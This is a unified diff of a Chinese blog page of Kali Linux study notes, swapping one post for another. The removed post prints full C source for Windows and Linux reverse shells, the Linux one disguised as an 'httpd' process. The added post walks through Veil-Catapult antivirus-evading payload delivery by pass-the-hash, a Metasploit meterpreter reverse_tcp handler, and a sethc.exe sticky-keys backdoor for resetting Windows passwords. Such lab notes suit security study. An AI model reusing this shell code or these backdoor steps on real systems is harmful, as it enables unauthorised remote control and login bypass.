@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="1. 自己编写后门 ▲ 2020.2.13window的shell都无法通过编译 Windows reverse shell 🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32    12345678910111213141516171819202122232425262728293031323334353637383">
+<meta name="description" content="1. Veil-catapult Payload的投递 集成veil-evasion生成免杀payload或自定义payload 使用Impacket上传二进制payload文件（前提需要有一个账号密码） 使用passing-the-hass出发执行payload   Payload直接在内存中运行（类似于SMBexec） 不向硬盘写入payload文件，避免文件型病毒查杀软件   ▲ 2020">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(九十一)：免杀技术--自编写shell">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;13&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(九十六)：Veil-Catapult">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;17&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AD)%EF%BC%9AVeil-Catapult&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 自己编写后门 ▲ 2020.2.13window的shell都无法通过编译 Windows reverse shell 🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32    12345678910111213141516171819202122232425262728293031323334353637383">
+<meta property="og:description" content="1. Veil-catapult Payload的投递 集成veil-evasion生成免杀payload或自定义payload 使用Impacket上传二进制payload文件（前提需要有一个账号密码） 使用passing-the-hass出发执行payload   Payload直接在内存中运行（类似于SMBexec） 不向硬盘写入payload文件，避免文件型病毒查杀软件   ▲ 2020">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.tomassky.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&amp;file_name=&#x2F;linux.sh.PNG">
-<meta property="og:updated_time" content="2020-02-13T12:49:36.267Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7819XGFlPCu-xbCZmwpD2Wlh_iFzp7KNhOpJNMGI7aEla9tmikg4gpPT8Ti-NpyPs0OTpMvVMAcQHAyYCHv4618Konbj4molFR9e8sqxWxZdpjjZFeECumQKh3Q00HAckcUo&amp;file_name=&#x2F;cmd%E6%9B%BF%E6%8D%A2sethc.exe.PNG">
+<meta property="og:updated_time" content="2020-02-17T13:35:52.784Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.tomassky.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&amp;file_name=&#x2F;linux.sh.PNG">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7819XGFlPCu-xbCZmwpD2Wlh_iFzp7KNhOpJNMGI7aEla9tmikg4gpPT8Ti-NpyPs0OTpMvVMAcQHAyYCHv4618Konbj4molFR9e8sqxWxZdpjjZFeECumQKh3Q00HAckcUo&amp;file_name=&#x2F;cmd%E6%9B%BF%E6%8D%A2sethc.exe.PNG">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/13/Kali Linux笔记(九十一)：免杀技术--自编写shell/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/17/Kali Linux笔记(九十六)：Veil-Catapult/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(九十一)：免杀技术--自编写shell | Tomas'Blog</title>
+  <title>Kali Linux笔记(九十六)：Veil-Catapult | Tomas'Blog</title>
   
 
 
@@ -245,7 +245,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AD)%EF%BC%9AVeil-Catapult/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -262,7 +262,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十一)：免杀技术--自编写shell</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十六)：Veil-Catapult</h1>
         
 
         <div class="post-meta">
@@ -274,8 +274,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:50:01+08:00">
-                2020-02-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-17T21:36:41+08:00">
+                2020-02-17
               </time>
             
 
@@ -328,7 +328,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  318 字
+                  527 字
                 </span>
               
 
@@ -344,7 +344,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -366,24 +366,89 @@
 
       
         <hr>
-<h4 id="1-自己编写后门"><a href="#1-自己编写后门" class="headerlink" title="1. 自己编写后门"></a>1. 自己编写后门</h4><ul>
-<li>▲ 2020.2.13window的shell都无法通过编译</li>
-<li>Windows reverse shell<ul>
-<li><strong><code>🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32</code></strong></li>
+<h4 id="1-Veil-catapult"><a href="#1-Veil-catapult" class="headerlink" title="1. Veil-catapult"></a>1. Veil-catapult</h4><ul>
+<li>Payload的投递<ul>
+<li>集成veil-evasion生成免杀payload或自定义payload</li>
+<li>使用Impacket上传二进制payload文件（前提需要有一个账号密码）</li>
+<li>使用passing-the-hass出发执行payload</li>
+</ul>
+</li>
+<li>Payload直接在内存中运行（类似于SMBexec）<ul>
+<li>不向硬盘写入payload文件，避免文件型病毒查杀软件</li>
+</ul>
+</li>
+<li>▲ 2020.2.17 依赖Veil-catapult</li>
+<li>▲ Github地址：<a href="https://github.com/Veil-Framework/Veil-Catapult" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Catapult</a></li>
+</ul>
+<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window 7（需要有powershell）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看网络连接，关闭防火墙</li>
+<li><strong><code>🔺命令：cmd → powershell</code></strong>尝试能否开启powershell</li>
+<li>抓包查看是否有数据到本地电脑</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：vi /etc/veil/settings.py</code></strong> → SPAWN_CATAPULT_HANDLER=”true”（默认情况下是投放完payload不开启msf，对EXE delivery起作用，对Standalone payloads不起作用）</li>
+<li><strong><code>🔺命令：msfconsole</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/multi/handler/</code></strong>（使用控制台）</li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong>（设置payload）</li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：set lhost 本机的IP</code></strong>（监听IP）</li>
+<li><strong><code>🔺命令：set lport 4444</code></strong>（监听端口4444）</li>
+<li><strong><code>🔺命令：set EXITFUNC thread</code></strong>（以线程的方式执行）</li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong>（执行）</li>
+<li><strong><code>🔺命令：session -l</code></strong>（查看session）</li>
+<li><strong><code>🔺命令：session -i 1</code></strong>（选择的session1）→ <strong><code>🔺命令：getuid/getpid</code></strong></li>
+</ul>
+</li>
+<li>veil-catapult<ul>
+<li>Standalone payloads</li>
+<li>EXE delivery</li>
+</ul>
+</li>
+<li>Standalone payloads<ul>
+<li>⭐Powershell injector（投放两个脚本+一个powershell指令，适用于Win7及以上版本）</li>
+<li>⭐Barebones python injector（同Powershell injector相同原理，适用于Powershell injector注入失败情况下）</li>
+<li>⭐Sethc backdoor（用cmd.exe替换C:\Windows\System32\sethc.exe，Sethc为连按shift五次的粘滞键程序，一般可通过物理接触）</li>
+<li>⭐Execute custom command </li>
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib,&quot;ws2_32&quot;)</span><br><span class="line"></span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  SOCKET Winsock;</span><br><span class="line">  SOCKET Sock;</span><br><span class="line">  struct sockaddr_in hax;</span><br><span class="line">  char ip_addr[16];</span><br><span class="line">  STARTUPINFO ini_processo;</span><br><span class="line">  PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(MAKEWORD(2,2),&amp;wsaData);</span><br><span class="line">    Winsock=WSASocket(AF_INET,SOCK_STREM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);</span><br><span class="line"></span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;Uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    struct hostent *host;</span><br><span class="line">    host = gethostbyname(argv[1]);</span><br><span class="line">    strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">    hax.sin_family = AF_INET;</span><br><span class="line">    hax.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,sizeof(hax),NULL,NULL,NULL,NULL);</span><br><span class="line"></span><br><span class="line">    memset(&amp;ini_processo,0,sizeof(ini_preocesso));</span><br><span class="line">    ini_processo.cb=sizeof(ini_processo);</span><br><span class="line">    ini_processo.dwFlags=STARTF_USESTDHANDLES;</span><br><span class="line">    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)winsock;</span><br><span class="line">    CreateProcess(NULL,&quot;cmd.exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;processo_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+</li>
+<li>Window 7（需要有powershell）<ul>
+<li>任务管理器查看注入的进程（通过pid）</li>
+<li>Kali执行完Sethc backdoor后，在登陆界面连按shift五次，修改win7密码</li>
+<li>重启挂载Kali硬盘<ul>
+<li><strong><code>🔺命令：fdisk -l</code></strong>查看挂载的硬盘</li>
+<li><strong><code>🔺命令：mount /dev/sda2（大文件硬盘）/mnt</code></strong></li>
+<li><strong><code>🔺命令：cd /mnt/Windows/System32</code></strong></li>
+<li><strong><code>🔺命令：mv sethc.exe sethc.exe.old</code></strong></li>
+<li><strong><code>🔺命令：cp cmd.exe sethc.exe</code></strong></li>
+<li>拔出光盘，<strong><code>🔺命令：reboot</code></strong></li>
+</ul>
+</li>
+<li>还原快照</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=7819XGFlPCu-xbCZmwpD2Wlh_iFzp7KNhOpJNMGI7aEla9tmikg4gpPT8Ti-NpyPs0OTpMvVMAcQHAyYCHv4618Konbj4molFR9e8sqxWxZdpjjZFeECumQKh3Q00HAckcUo&file_name=/cmd%E6%9B%BF%E6%8D%A2sethc.exe.PNG" alt="cmd替换sethc"></p>
 <ul>
-<li>Linux shell<ul>
-<li><strong><code>🔺命令：gcc -o linux.sh linux_revers_shell.c</code></strong></li>
+<li>Kali<ul>
+<li>开启Wireshark抓包，抓取ping的rely包</li>
+<li>Standalone payloads<ul>
+<li>Execute custom command（执行子命令）</li>
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    struct sockaddr_in sock;</span><br><span class="line">    int s;</span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    sock.sin_family = AF_INET;</span><br><span class="line">    sock.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    sock.sin_addr.s_addr = inet_addr(argv[1]);</span><br><span class="line">    s=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line"></span><br><span class="line">    connect(s,(struct sockaddr_in *)&amp;sock,sizeof(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">    dup2(s,0);</span><br><span class="line">    dup2(s,1);</span><br><span class="line">    dup2(s,2);</span><br><span class="line">    execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0);  //process httpd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&file_name=/linux.sh.PNG" alt="linux.sh"></p>
+</li>
+</ul>
 
       
     </div>
@@ -414,8 +479,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/" rel="next" title="Kali Linux笔记(九十)：免杀技术--模板程序附着">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十)：免杀技术--模板程序附着
+              <a href="/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%94)%EF%BC%9AVeil-Evasion/" rel="next" title="Kali Linux笔记(九十五)：Veil-Evasion">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十五)：Veil-Evasion
               </a>
             
           </div>
@@ -423,10 +488,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="prev" title="Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串">
-                Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -596,7 +657,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-自己编写后门"><span class="nav-number">1.</span> <span class="nav-text">1. 自己编写后门</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Veil-catapult"><span class="nav-number">1.</span> <span class="nav-text">1. Veil-catapult</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-实验"><span class="nav-number">2.</span> <span class="nav-text">2. 实验</span></a></li></ol></div>
             
 
           </div>
